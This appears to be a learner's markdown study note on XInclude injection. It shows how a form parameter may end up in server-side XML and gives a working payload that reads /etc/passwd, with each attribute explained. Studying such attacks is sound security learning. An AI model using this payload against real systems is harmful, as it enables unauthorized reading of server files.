# xinclude

> in case of request does not send xml input directly, the backed might map the query to an xml

```
POST /product/stock HTTP/2
...
productId=3&storeId=1
```

- backend might map it to

```
<stockCheck>
  <productId>3</productId>
  <storeId>1</storeId>
</stockCheck>
```

- so an injected xml exploit could work like

```
<stockCheck>
  <productId>EXPLOIT_HERE</productId>
  <storeId>1</storeId>
</stockCheck>
```

> a good solution for an exploit like this is `XInclude`

- `XInclude` is a XML standard, lets one XML document pull in content from another location, like an `<iframe>`
- it is for modularizing large XML documents

> payload details

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

- `xmlns:xi="http://www.w3.org/2001/XInclude"` -> declares the `xi` namespace prefix and binds it to the official XInclude spec namespace, without it just look like a meaningless custom tag
- `<xi:include .../>` -> the actual instruction
- `parse="text"` -> tells the parser to treat the fetched content as plain text and insert it literally
- `href="file:///etc/passwd"` -> the local file to read
- `<foo>...</foo>` -> just a wrapper element, xi:include has to live inside some parent element to be valid XML
